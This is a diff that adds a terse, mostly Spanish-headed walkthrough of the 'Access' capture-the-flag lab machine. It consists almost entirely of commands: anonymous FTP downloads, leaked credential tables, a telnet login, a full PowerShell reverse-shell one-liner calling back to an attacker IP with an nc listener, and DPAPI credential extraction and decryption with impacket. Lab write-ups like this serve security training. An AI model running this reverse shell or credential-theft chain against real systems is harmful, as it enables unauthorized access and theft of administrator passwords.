@@ -1,0 +1,79 @@
+---
+title: "Access"
+---
+
+# Access
+
+```
+ftp 10.10.10.98
+
+anonymous
+```
+
+```bash
+wget --no-passive-ftp ftp://anonymous:@10.10.10.98/Backups/backup.mdb
+```
+
+```bash
+wget --no-passive-ftp ftp://anonymous:@10.10.10.98/Engineer/"Access Control.zip"
+```
+
+# Abrir archivo .mdb - Microsoft Access
+
+
+**auth_user**
+|id|username|password|Status|last_login|RoleID|
+|---|---|---|---|---|---|
+|25|admin|admin|1|23/08/2018 21:11:47|26|
+|27|engineer|access4u@security|1|23/08/2018 21:13:36|26|
+|28|backup_admin|admin|1|23/08/2018 21:14:02|26|
+
+# Abrir archivo .pst - Outlook
+
+Configuración > Archivo > Abrir archivo
+
+<img src="data:image/png;base64,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">
+
+```bash
+readpst file.pst
+```
+
+```
+telnet 10.10.10.98
+```
+
+```
+security \ 4Cc3ssC0ntr0ller
+```
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+```powershell
+$path = "C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580"
+
+[Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
+```
+
+```bash
+impacket-dpapi masterkey -file masterkey.blob -password '4Cc3ssC0ntr0ller' -sid S-1-5-21-953262931-566350628-63446256-1001
+```
+
+```powershell
+$path = "C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"
+
+[Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
+```
+
+```bash
+impacket-dpapi credential -file credential.blob -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
+```
+
+```
+Administrator \ 55Acc3ssS3cur1ty@megacorp
+```
